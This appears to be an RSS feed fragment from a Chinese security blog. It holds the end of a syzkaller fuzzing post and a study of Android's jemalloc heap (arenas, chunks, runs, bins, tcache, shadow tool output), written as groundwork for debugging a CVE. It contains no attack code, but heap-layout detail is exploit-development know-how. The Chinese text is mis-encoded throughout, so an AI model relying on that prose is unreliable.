&lt;h3 id="0x04-æ€»ç»“">0x04 æ€»ç»“&lt;/h3>
&lt;p>è¿˜æœ‰å¾ˆå¤šé€‰é¡¹å¯ä»¥å¼€å¯ï¼Œæ²¡è¯•ã€‚&lt;/p>
&lt;p>çœ‹çœ‹å®ç°æºç ï¼Œè¿˜æœ‰å°±æ˜¯ä¹‹åè¯•è¯•Fuzzing Android&lt;/p>
&lt;h3 id="å‚è€ƒ">å‚è€ƒ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/google/syzkaller" target="_blank" rel="noopener"
>https://github.com/google/syzkaller&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.freebuf.com/sectool/142969.html" target="_blank" rel="noopener"
>https://www.freebuf.com/sectool/142969.html&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="http://blog.douluodalu.wang/2020/03/22/syz-fuzz%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener"
>http://blog.douluodalu.wang/2020/03/22/syz-fuzz%E5%88%9D%E6%8E%A2/&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/google/syzkaller/blob/master/docs/linux/setup.md" target="_blank" rel="noopener"
>https://github.com/google/syzkaller/blob/master/docs/linux/setup.md&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>Androidä¹‹jemalloc</title><link>https://ykiko.top/p/android%E4%B9%8Bjemalloc/</link><pubDate>Sun, 05 Apr 2020 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/android%E4%B9%8Bjemalloc/</guid><description>&lt;h1 id="androidä¹‹jemalloc">Androidä¹‹jemalloc&lt;/h1>
&lt;h3 id="0x00-ç®€å•ä»‹ç»">0x00 ç®€å•ä»‹ç»&lt;/h3>
&lt;p>æƒ³è°ƒä¸€ä¸ªCVEã€å‘ç°å¯¹jemalloc äº†è§£å¤ªå°‘ã€‚é‡æ–°å¤ä¹ å¤ä¹ jemallocï¼Œåšä¸ªè®°å½•ã€‚&lt;/p>
&lt;p>jemallocæœ€åˆæ˜¯2005å¹´ Jason Evanså¼€å‘çš„æ–°ä¸€ä»£å†…å­˜åˆ†é…å™¨ï¼Œ ä¹‹åæ²¡å¤šä¹…è¢«æ·»åŠ åˆ°FreeBSDçš„libcä¸­çš„é»˜è®¤å†…å­˜åˆ†é…å™¨ï¼Œç”¨æ¥æ›¿ä»£åŸæ¥çš„phkmallocã€‚2007å¹´ Firefox Mozillaé¡¹ç›®çš„ç‹¬ç«‹ç‰ˆæœ¬ä¹Ÿå°†jemallocä½œä¸ºä¸»è¦çš„åˆ†é…å™¨ã€‚2009å¹´ï¼ŒFacebook çš„åç«¯é¡¹ç›®ä¹Ÿå¹¿æ³›ä½¿ç”¨jemallocã€‚2014å¹´ï¼ŒAndroid 5 å¼€å§‹é‡‡ç”¨jemallocä½œä¸ºä¸»è¦çš„å†…å­˜åˆ†é…å™¨ï¼Œä¸è¿‡éƒ¨åˆ†Android5/6ä¾ç„¶èƒ½çœ‹åˆ°dlmallocå’Œjemallocä¸¤è€…å¹¶å­˜ã€‚&lt;/p>
&lt;p>jemallocçš„ä¸€äº›ç‰¹æ€§ä¸è®¾è®¡åŸåˆ™ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å¼ºå¤§çš„å¤šæ ¸/å¤šçº¿ç¨‹åˆ†é…èƒ½åŠ›.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æœ€å°åŒ–çš„å…ƒæ•°æ®å¼€é”€&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åŸºäºæ¯ä¸ªçº¿ç¨‹è¿›è¡Œç¼“å­˜ï¼Œé¿å…äº†åŒæ­¥é—®é¢˜ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>é¿å…äº†è¿ç»­åˆ†é…å†…å­˜çš„ç¢ç‰‡åŒ–é—®é¢˜ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç®€æ´é«˜æ•ˆ&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-ç»“æ„">0x01 ç»“æ„&lt;/h3>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403011045.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>ç»“æ„å›¾&lt;/p>
&lt;blockquote>
&lt;p>jemallocå¯¹å†…å­˜åˆ’åˆ†æŒ‰ç…§å¦‚ä¸‹ç”±é«˜åˆ°ä½çš„é¡ºåº:&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>å†…å­˜æ˜¯ç”±ä¸€å®šæ•°é‡çš„arenasè¿›è¡Œç®¡ç†.ä¸€ä¸ªarenaè¢«åˆ†å‰²æˆè‹¥å¹²chunks, åè€…ä¸»è¦è´Ÿè´£è®°å½•bookkeepingï¼ˆè®°å½•ä¿¡æ¯ï¼‰.chunkå†…éƒ¨åˆåŒ…å«ç€è‹¥å¹²runs, ä½œä¸ºåˆ†é…å°å—å†…å­˜çš„åŸºæœ¬å•å…ƒ.runç”±pagesç»„æˆ, æœ€ç»ˆè¢«åˆ’åˆ†æˆä¸€å®šæ•°é‡çš„regionså¯¹äºsmall sizeçš„åˆ†é…è¯·æ±‚æ¥è¯´, è¿™äº›regionå°±ç›¸å½“äºuser memory.&lt;/p>
&lt;/blockquote>
&lt;h3 id="arenas">arenas&lt;/h3>
&lt;p>å¯¹äºAndroidæ¥è¯´ï¼š&lt;/p>
&lt;p>é™åˆ¶äº†åªä½¿ç”¨ä¸¤ä¸ªarenas,æ¯ä¸ªå¸¦æœ‰ä¸€ä¸ªlockã€‚è¿™æ„å‘³ç€ï¼Œä¸åŒçº¿ç¨‹å°è¯•åˆ†é…å†…å­˜æ—¶ï¼Œä¼šå¾ªç¯ã€å¹³å‡åˆ†é…è‡³ä¸¤ä¸ªarenaï¼Œç¡®ä¿ä¸¤ä¸ªarenaæœ‰å¤§è‡´ç›¸ç­‰çš„è¿›ç¨‹æ•°é‡ã€‚åªæœ‰åœ¨ç›¸åŒçš„arenaä¸­åˆ†é…å†…å­˜æ—¶æ‰éœ€è¦è·å–lockã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#/android.bp
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="n">android_product_variables&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Only enable the tcache on non-svelte configurations, to save PSS.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nl">malloc_not_svelte&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nl">cflags&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;-UANDROID_MAX_ARENAS&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;-DANDROID_MAX_ARENAS=2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;-DJEMALLOC_TCACHE&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;-DANDROID_TCACHE_NSLOTS_SMALL_MAX=8&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;-DANDROID_TCACHE_NSLOTS_LARGE=16&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç”¨shadowæŸ¥çœ‹arenas&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403015253.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="chunk">chunk&lt;/h3>
&lt;p>ä¸€ä¸ªarenaä¸‹ä¼šæœ‰è‹¥å¹²ä¸ªchunkï¼ŒAndroid 7ä¹‹å‰chunkä¸º256kï¼Œä¹‹å32ä½ç³»ç»Ÿæ”¹ä¸º512kï¼Œ64ä½ç³»ç»Ÿæ”¹ä¸º2MBã€‚&lt;/p>
&lt;p>æ¯ä¸ªchunkéƒ½æœ‰ä¸€ä¸ªchunk head åŒ…å«ç€è¿™ä¸ªchunkçš„å…ƒæ•°æ®ï¼ˆmetadataï¼‰.Android 7ä¹‹åå…ƒæ•°æ®å¢åŠ äº†mapbiasä¸mapbits flagsã€‚&lt;/p>
&lt;p>chunkæ˜¯å­˜æ”¾runçš„å®¹å™¨ï¼Œå¤§å°å›ºå®šç›¸åŒï¼Œæ“ä½œç³»ç»Ÿè¿”å›çš„å†…å­˜è¢«åˆ’åˆ†åˆ°chunkä¸­ç®¡ç†&lt;/p>
&lt;p>chunkä¸­çš„å…ƒæ•°æ®ç»“æ„ï¼Œmapbit[0]ä¸mapmisc[0]æŒ‡å‘chunkä¸­çš„ç¬¬ä¸€ä¸ªrunï¼š&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403012851.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>chunkå…ƒæ•°æ®ä¸­mapmiscä¸­çš„bitmapç»“æ„ç®¡ç†ç€runä¸­çš„regionçš„åˆ†é…ä½¿ç”¨ï¼š&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403013355.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>chunk&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403015412.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="run">run&lt;/h3>
&lt;p>runæ˜¯å­˜æ”¾è¿ç»­çš„å¤§å°ç›¸åŒçš„regionçš„å®¹å™¨ï¼Œæ¯ä¸ªchunkä¸­ä¼šåŒ…å«è‹¥å¹²ä¸ªrunï¼Œè€Œrunçš„metadataä¼šå­˜æ”¾åœ¨chunkçš„headerå½“ä¸­ï¼Œè¿™æ ·regioné‡Œåªå­˜æ”¾æ•°æ®æœ¬èº«ï¼Œä¸å†æœ‰å†…å­˜å±æ€§è¯´æ˜ã€‚&lt;/p>
&lt;h3 id="region">region&lt;/h3>
&lt;p>regionæ˜¯æœ€å°çš„å­˜å‚¨å•å…ƒï¼Œæ¯ä¸ªruné‡Œé¢çš„regionå¤§å°å®Œå…¨ç›¸åŒï¼Œä¹Ÿæ²¡æœ‰å…ƒæ•°æ®ï¼Œmallocå®é™…è¿”å›çš„æ˜¯regionçš„åœ°å€ã€‚&lt;/p>
&lt;h3 id="bins">bins&lt;/h3>
&lt;p>jemallocä¹Ÿç”¨binæ¥ç®¡ç†å†…å­˜ï¼Œå…±æœ‰39ä¸ªbinsã€‚binçš„metadataå­˜æ”¾äºarenaçš„headerä¸­ï¼Œ39ä¸ªbinè¿˜ä¼šå­˜æ”¾å½“å‰æ­£åœ¨ä½¿ç”¨çš„runã€‚æ‰€æœ‰å¸¦æœ‰ç©ºé—²regionçš„runå’Œé—²ç½®çš„chunkä¿¡æ¯ä¼šè¢«æ”¾ç½®åœ¨çº¢é»‘æ ‘ç»“æ„å½“ä¸­ï¼Œè¿™æ ·å¯»æ‰¾ç©ºé—²å†…å­˜çš„å¤æ‚åº¦å¯ä»¥æ§åˆ¶åœ¨o(log(n))ã€‚&lt;/p>
&lt;h3 id="tcache">tcache&lt;/h3>
&lt;p>ä¸ºäº†ä¼˜åŒ–å¤šçº¿ç¨‹æ€§èƒ½ï¼Œjemallocè¿˜é‡‡ç”¨äº†LIFOç»“æ„çš„tcacheï¼Œå­˜æ”¾è¿‘æœŸè¢«é‡Šæ”¾çš„regionï¼Œæ¯ä¸ªçº¿ç¨‹çš„æ¯ä¸ªbinéƒ½å¯¹åº”ä¸€ä¸ªtcacheï¼Œå­˜æ”¾åœ¨tcacheä¸­çš„å†…å­˜å¹¶ä¸ä¼šè®¾ç½®freeæ ‡è®°ä½ï¼Œå¹¶ä¸”ç”±äºtacheé™„ç€äºçº¿ç¨‹æœ¬èº«ï¼Œä½¿å¾—å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä»tcacheåˆ†é…å†…å­˜æ—¶å®Œå…¨æ— éœ€lockã€‚&lt;/p>
&lt;p>å½“jemallocæ–°åˆ†é…ä¸€å—å†…å­˜æ˜¯å‘ç°tcacheä¸ºç©ºï¼Œä¼šè§¦å‘prefilläº‹ä»¶ï¼Œæ­¤æ—¶jemallocä¼šå°†å•å‰çš„arenaä¸Šlock,å¹¶ä»å½“å‰runä¸­å–å‡ºä¸€å®šæ•°é‡çš„regionå­˜å…¥tcacheï¼Œä¿è¯tcacheä¸ä¸ºç©ºã€‚&lt;/p>
&lt;p>å½“tcacheæ»¡äº†ï¼ˆsmall binæ˜¯8ï¼Œlarger binæ˜¯20ï¼‰çš„æ—¶å€™ï¼Œä¼šè§¦å‘flush äº‹ä»¶ï¼Œä¼šé‡Šæ”¾éƒ¨åˆ†regionï¼Œå¹¶ä¸”æ‰ä¼šè¢«æ ‡è®°ä¸ºå·²é‡Šæ”¾ã€‚è¿™æ—¶è¿™äº›regionæ‰èƒ½è¢«å…¶ä»–çº¿ç¨‹è‡ªç”±åˆ†é…ã€‚&lt;/p>
&lt;p>æ­¤å¤–ï¼Œjemallocä¹Ÿå®ç°æ˜¯GCæœºåˆ¶ã€‚ä¼šæœ‰ä¸€ä¸ªè®¡æ•°å™¨ç»Ÿè®¡ç”³è¯·å’Œé‡Šæ”¾ï¼Œè¾¾åˆ°é˜ˆå€¼ä¹‹åä¼šè§¦å‘ç‰¹åˆ«çš„äº‹ä»¶ï¼Œç›®æ ‡biné‡Œçš„tcacheçš„å››åˆ†ä¹‹ä¸‰çš„regionä¼šè¢«é‡Šæ”¾æ‰ã€‚ä¸‹æ¬¡GCæ—¶ä¼šè½®åˆ°ä¸‹ä¸€ä¸ªbinã€‚è¿™æ˜¯å¯ä»¥ä»tcacheä¸­åˆ é™¤regionå¹¶ä½¿å…¶æ¢å¤å¸¸è§„å¯ç”¨æ€§çš„å¦ä¸€ç§æ–¹æ³•ã€‚&lt;/p>
&lt;h3 id="åˆ†é…æµç¨‹">åˆ†é…æµç¨‹&lt;/h3>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403022314.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;blockquote>
&lt;p>è®¡ç®—ç”³è¯·å†…å­˜å¤§å°ä»å½“å‰çº¿ç¨‹çš„tcacheä¸­æ‰¾åˆ°åˆé€‚çš„binå¦‚æœtcacheä¸ºç©ºï¼Œå°±ä»å½“å‰çš„runä¸­prefillä¸€äº›regionè¿›æ¥å¦‚æœå½“å‰runè€—å°½ï¼Œå°±ä»ä½åœ°å€å¼€å§‹æ‰¾åˆ°ç¬¬ä¸€ä¸ªéç©ºrunå¦‚æœç°æœ‰runé‡Œæ²¡æœ‰è¶³å¤Ÿçš„å†…å­˜å°±åˆ†é…ä¸€ä¸ªæ–°runå¦‚æœchunké‡Œæ²¡æœ‰ç©ºé—´äº†å°±åˆ†é…ä¸€ä¸ªæ–°chunkï¼ŒåŒæ—¶åˆ†é…æ–°runå¹¶prefillä¸€äº›regionåˆ°tcache&lt;/p>
&lt;/blockquote>
&lt;h3 id="0x02-shadow">0x02 shadow&lt;/h3>
&lt;p>ä½¿ç”¨shadowæŸ¥çœ‹Androidä¸­çš„å†…å­˜å¸ƒå±€ï¼Œç®€å•å­¦ä¹ ä¸‹shadowçš„ä½¿ç”¨&lt;/p>
&lt;h3 id="æŸ¥çœ‹arenas">æŸ¥çœ‹arenas&lt;/h3>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403022557.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°ä¸€å…±ä¸¤ä¸ªarenasï¼Œæ¯ä¸ªarenaæœ‰36ä¸ªbinï¼Œä¸€å…±2ä¸ªchunkã€‚&lt;/p>
&lt;h3 id="æŸ¥çœ‹chunks">æŸ¥çœ‹chunks&lt;/h3>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403023042.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å•ä¸ªchunkï¼ŒæŸ¥çœ‹chunkä¸­çš„run&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403023253.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æŸ¥çœ‹runsï¼Œä¼šåˆ—å‡ºå•å‰æ‰€æœ‰çš„runçš„è¯¦æƒ… run_siez = region_size*no_regions&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403023401.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>åªæ˜¾ç¤ºå•å‰è¿è¡Œä¸­çš„run&lt;/p>
&lt;p>æ˜¯å¦æ˜¯allocatedçŠ¶æ€æ˜¯æ ¹æ®arena_chunk_map_bits_s å¯¹åº” bitsçš„ ç¬¬ [0] bit æ¥ç¡®å®š è¿™é‡Œjemalloc5 å’Œ jemalloc4 3ä¸ä¸€æ ·ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403023454.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æŸ¥çœ‹å•ä¸ªrunçš„è¯¦æƒ…ï¼š&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/image-20200403023549875.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>runçš„å¸ƒå±€å¦‚ä¸‹ï¼š&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200405030548.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æºä»£ç arena.hä¸­æœ‰å¾ˆå¤šå…³äºbitsä¹‹ç±»çš„æ³¨é‡Šã€‚èƒ½å¤Ÿå¸®åŠ©ç†è§£ã€‚&lt;/p>
&lt;p>æŸ¥çœ‹bins:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">arena_bin_s&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">malloc_mutex_t&lt;/span> &lt;span class="n">lock&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">arena_run_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">runcur&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">arena_run_heap_t&lt;/span> &lt;span class="n">runs&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//4ä¹‹å‰ç‰ˆæœ¬ä¸ºarena_run_tree_t ç±»å‹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">malloc_bin_stats_t&lt;/span> &lt;span class="n">stats&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//ç»Ÿè®¡ä¿¡æ¯
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>runcur:&lt;/strong> å½“å‰å¯ç”¨äºåˆ†é…çš„run, ä¸€èˆ¬æƒ…å†µä¸‹æŒ‡å‘åœ°å€æœ€ä½çš„non-full run, åŒä¸€æ—¶é—´ä¸€ä¸ªbinåªæœ‰ä¸€ä¸ªcurrent runç”¨äºåˆ†é….&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200403023802.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>çœ‹åˆ«äººçš„æ–‡ç« è¯´æ˜¯é™¤å»0å·binä»¥å¤–æ²¡4ä¸ªbinä¸ºä¸€ç»„ï¼Œç»„å†…sizeå·®ä¸€æ ·ï¼Œä½†æ˜¯åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°æ¯8ä¸ªä¸ºä¸€ç»„ï¼Œ01-8å·binçš„sizeå·®å€¼éƒ½ä¸º0x10,ç®—æ˜¯ç¬¬ä¸€ç»„ï¼Œé‚£ç¬¬äºŒç»„å°±ä¸º9-12å·ï¼Œåªæœ‰4ä¸ªbin sizeå·®å€¼ä¸º0x20,ä½†æ˜¯æœ‰çš„ä¸ºç©ºï¼Œç®—ç¬¬äºŒç»„ã€‚æ²¡ä¸¤ç»„ä¹‹é—´çš„å·®å€¼2å€ã€‚ä»¥æ­¤ç±»æ¨ï¼Œåé¢æ¯4ä¸ªä¸ºä¸€ç»„ã€‚&lt;/p>
&lt;p>åˆ’åˆ†ä¸º{0}ã€{1-8}ã€{9-12}ã€{13-16}Â·Â·Â·Â·Â· å¯èƒ½ä¸åŒç‰ˆæœ¬ä¼šæœ‰åŒºåˆ«ã€‚&lt;/p>
&lt;p>æŸ¥çœ‹regions [æ¢äº†ä¸€ä¸ªè¿›ç¨‹]&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200405031010.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å¤§å°éƒ½æ˜¯0x8&lt;/p>
&lt;p>æŒ‰å¤§å°æŸ¥æ‰¾ï¼šç¬¬4ä¸ªï¼š&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200405031343.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>tchcheæŸ¥çœ‹ï¼š&lt;/p>
&lt;p>tcacheçš„å®šä¹‰ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">tcache_bin_info_s&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="n">ncached_max&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Upper limit on ncached. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">tcache_bin_s&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">tcache_bin_stats_t&lt;/span> &lt;span class="n">tstats&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">low_water&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Min # cached since last GC. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="n">lg_fill_div&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Fill (ncached_max &amp;gt;&amp;gt; lg_fill_div). */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="n">ncached&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* # of cached objects. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * To make use of adjacent cacheline prefetch, the items in the avail
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * stack goes to higher address for newer allocations. avail points
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * just above the available space, which means that
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * avail[-ncached, ... -1] are available items and the lowest item will
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * be allocated first.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">void&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">avail&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Stack of available objects. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">tcache_s&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ql_elm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">tcache_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">link&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Used for aggregating stats. */&lt;/span>
